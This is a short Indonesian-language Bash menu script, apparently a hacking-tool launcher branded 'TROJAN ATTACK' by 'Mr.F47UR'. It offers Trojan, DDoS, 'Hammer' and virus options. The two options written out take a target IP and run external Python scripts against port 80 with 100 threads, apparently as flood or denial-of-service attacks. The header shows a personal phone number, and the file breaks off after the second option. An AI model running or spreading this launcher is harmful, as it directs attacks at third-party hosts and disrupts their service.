blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
clear
toilet -f slant " TROJAN ATTACK " |lolcat
echo
echo
echo $blue"---------------------------------------"
echo $blue"AUTOUR  :Mr.F47UR "
echo $blue"VERSION :1.0"
echo $blue"JUDUL     :F47UR TOOLS "
echo $red"---------------------------------------"
echo $green"?Facebook :AdityaPratama        "
echo $green"?WhatsApp:+6282244896793              "
echo $green"?Message :Hargai KerjaKeras Saya     "
echo $red"---------------------------------------"
echo $yellow"                 OMOM"
echo $red"---------------------------------------"
echo $white"[1]. TROJAN"
echo $white"[2]. DROID"
echo $white"[3]. DDOS"
echo $white"[4]. HAMMER"
echo $white"[5]. VIRUS"
echo $white"[0].EXIT"
echo $red"---------------------------------------"
echo $red"MASUKAN PILIHAN ANDA"
read -p "PILIH>>==>" bro;
echo
if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
toilet -f slant " F47UR TROJAN " |lolcat
echo $red"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python win.32.64.NT.py -s$ipt -p80 -t100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
toilet -f slant " F47UR DROID " |lolcat
echo $red"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python andromeda.py -s$ipt -p80 -t100
fi